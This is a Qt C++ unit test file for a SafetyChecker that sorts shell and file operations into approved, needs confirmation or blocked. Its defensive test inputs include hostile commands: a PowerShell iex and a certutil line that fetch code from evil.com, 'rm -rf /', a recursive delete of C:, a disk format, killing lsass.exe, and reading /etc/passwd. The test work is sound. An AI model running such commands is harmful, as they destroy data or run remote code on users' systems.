#include <QtTest>
#include <QCoreApplication>
#include "safetychecker.h"
#include "operationplan.h"

class TestSafetyChecker : public QObject
{
    Q_OBJECT

private slots:
    void initTestCase()
    {
        static int argc = 0;
        static char *argv[] = {nullptr};
        if (!QCoreApplication::instance())
            new QCoreApplication(argc, argv);
    }

    // ── Default paths ──

    void testDefaultPaths()
    {
        SafetyChecker sc;
        QStringList paths = sc.allowedPaths();
        QVERIFY(!paths.isEmpty());
        QVERIFY(paths.contains(QDir::homePath()));
    }

    void testSetAllowedPaths()
    {
        SafetyChecker sc;
        QStringList custom = {"/tmp", "/home/user/projects"};
        sc.setAllowedPaths(custom);
        QCOMPARE(sc.allowedPaths(), custom);
    }

    void testAddAllowedPath()
    {
        SafetyChecker sc;
        sc.setAllowedPaths({"/tmp"});
        sc.addAllowedPath("/home/user");
        QVERIFY(sc.allowedPaths().contains("/tmp"));
        QVERIFY(sc.allowedPaths().contains("/home/user"));
    }

    void testAddAllowedPath_NoDuplicate()
    {
        SafetyChecker sc;
        sc.setAllowedPaths({"/tmp"});
        sc.addAllowedPath("/tmp");
        QCOMPARE(sc.allowedPaths().size(), 1);
    }

    void testResetToDefaults()
    {
        SafetyChecker sc;
        sc.setAllowedPaths({"/custom"});
        sc.resetToDefaults();
        QVERIFY(sc.allowedPaths().contains(QDir::homePath()));
    }

    // ── Shell command validation ──

    void testValidateOperation_EmptyCommand()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testValidateOperation_SafeCommand()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "echo hello";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
    }

    void testValidateOperation_SudoBlocked()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "sudo rm /tmp/test";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testValidateOperation_RmRfRoot()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "rm -rf /";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testValidateOperation_RmRequiresConfirm()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/home/user/projects");
        ShellOperation op;
        op.command = "rm /home/user/projects/file.txt";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::NeedsConfirmation);
    }

    void testValidateOperation_CurlIsCaution()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "curl https://example.com";
        SafetyChecker::Result r = sc.validateOperation(op);
        QVERIFY(r != SafetyChecker::Approved);
    }

    void testValidateOperation_RmNeedsConfirm()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/tmp");
        sc.addAllowedPath(QDir::homePath());
        ShellOperation op;
        op.command = "rm /tmp/test_file.txt";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::NeedsConfirmation);
    }

    // ── Injection detection ──

    void testValidateOperation_BacktickInjection()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "echo `rm -rf /`";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testValidateOperation_DollarParenInjection()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "echo $(whoami)";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testValidateOperation_EvalBlocked()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "eval echo hello";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    // ── Windows injection detection ──

    void testWindowsInjection_InvokeExpression()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "powershell Invoke-Expression \"rm -rf C:\\\"";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsInjection_Iex()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com')";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsInjection_EncodedCommand()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "powershell -EncodedCommand SQBFAFgAIAAoACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAA...";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsInjection_CmdSubshell()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "cmd /c del /f /s /q C:\\*";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsInjection_Comspec()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "%COMSPEC% /c echo bad";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsInjection_Certutil()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "certutil -urlcache -f http://evil.com/payload.exe bad.exe";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    // ── Windows dangerous commands ──

    void testWindowsDangerous_Runas()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "runas /user:admin cmd.exe";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsDangerous_Format()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "format C: /fs:ntfs /q";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsDangerous_Diskpart()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "diskpart /s script.txt";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsDangerous_RegDelete()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "reg delete HKLM\\SOFTWARE\\Microsoft /f";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsDangerous_Taskkill()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "taskkill /f /im lsass.exe";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testWindowsDangerous_Shutdown()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "shutdown /s /t 0 /f";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    // ── New operation type validation ──

    void testNativeOp_CreateDir_InAllowedPath()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/home/user/projects");
        ShellOperation op;
        op.type = ShellOperation::CreateDir;
        op.target = "/home/user/projects/new_dir";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
    }

    void testNativeOp_CreateDir_SystemPath()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.type = ShellOperation::CreateDir;
        op.target = "/etc/bad";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testNativeOp_DeleteFile_NeedsConfirmation()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/tmp");
        ShellOperation op;
        op.type = ShellOperation::DeleteFile;
        op.source = "/tmp/test_file";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::NeedsConfirmation);
    }

    void testNativeOp_MoveFile_Approved()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/home/user/projects");
        ShellOperation op;
        op.type = ShellOperation::MoveFile;
        op.source = "/home/user/projects/src";
        op.target = "/home/user/projects/dst";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
    }

    void testNativeOp_MoveFile_SystemTarget()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.type = ShellOperation::MoveFile;
        op.source = "/tmp/src";
        op.target = "/etc/dst";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testNativeOp_CopyFile_BothPathsChecked()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/home/user/projects");
        ShellOperation op;
        op.type = ShellOperation::CopyFile;
        op.source = "/etc/passwd";  // system path
        op.target = "/home/user/projects/dst";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testNativeOp_WriteFile_Approved()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/tmp");
        ShellOperation op;
        op.type = ShellOperation::WriteFile;
        op.target = "/tmp/output.txt";
        op.command = "content";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
    }

    void testNativeOp_WriteFile_SystemPath()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.type = ShellOperation::WriteFile;
        op.target = "/etc/config";
        op.command = "bad config";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
    }

    void testNativeOp_SearchFiles_Approved()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/home/user/projects");
        ShellOperation op;
        op.type = ShellOperation::SearchFiles;
        op.source = "/home/user/projects";
        op.command = "*.txt";
        QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
    }

    // ── Plan validation ──

    void testValidatePlan_EmptyPlan()
    {
        SafetyChecker sc;
        OperationPlan plan;
        QCOMPARE(sc.validatePlan(plan), SafetyChecker::Blocked);
    }

    void testValidatePlan_AllApproved()
    {
        SafetyChecker sc;
        OperationPlan plan;
        plan.requiresConfirmation = false;
        ShellOperation op1;
        op1.command = "echo hello";
        ShellOperation op2;
        op2.command = "ls -la";
        plan.operations = {op1, op2};
        QCOMPARE(sc.validatePlan(plan), SafetyChecker::Approved);
    }

    void testValidatePlan_RequiresConfirmation()
    {
        SafetyChecker sc;
        OperationPlan plan;
        plan.requiresConfirmation = true;
        ShellOperation op1;
        op1.command = "echo hello";
        plan.operations = {op1};
        QCOMPARE(sc.validatePlan(plan), SafetyChecker::NeedsConfirmation);
    }

    void testValidatePlan_HasDangerous()
    {
        SafetyChecker sc;
        sc.addAllowedPath("/tmp");
        OperationPlan plan;
        plan.requiresConfirmation = false;
        ShellOperation op1;
        op1.command = "echo hello";
        ShellOperation op2;
        op2.command = "rm /tmp/test";
        plan.operations = {op1, op2};
        QCOMPARE(sc.validatePlan(plan), SafetyChecker::NeedsConfirmation);
    }

    // ── Danger level ──

    void testDangerLevel_Safe()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "echo hello";
        QCOMPARE(sc.dangerLevel(op), SafetyChecker::Safe);
    }

    void testDangerLevel_Caution()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "rm file.txt";
        QCOMPARE(sc.dangerLevel(op), SafetyChecker::Caution);
    }

    void testDangerLevel_Dangerous()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "sudo ls";
        QCOMPARE(sc.dangerLevel(op), SafetyChecker::Dangerous);
    }

    void testDangerLevel_NativeCreateDir_Safe()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.type = ShellOperation::CreateDir;
        op.target = "/tmp/test";
        QCOMPARE(sc.dangerLevel(op), SafetyChecker::Safe);
    }

    void testDangerLevel_NativeDeleteFile_Caution()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.type = ShellOperation::DeleteFile;
        op.source = "/tmp/test";
        QCOMPARE(sc.dangerLevel(op), SafetyChecker::Caution);
    }

    // ── Last block reason ──

    void testLastBlockReason()
    {
        SafetyChecker sc;
        ShellOperation op;
        op.command = "sudo rm /tmp/test";
        sc.validateOperation(op);
        QVERIFY(!sc.lastBlockReason().isEmpty());
    }
};

QTEST_GUILESS_MAIN(TestSafetyChecker)
#include "test_safetychecker.moc"
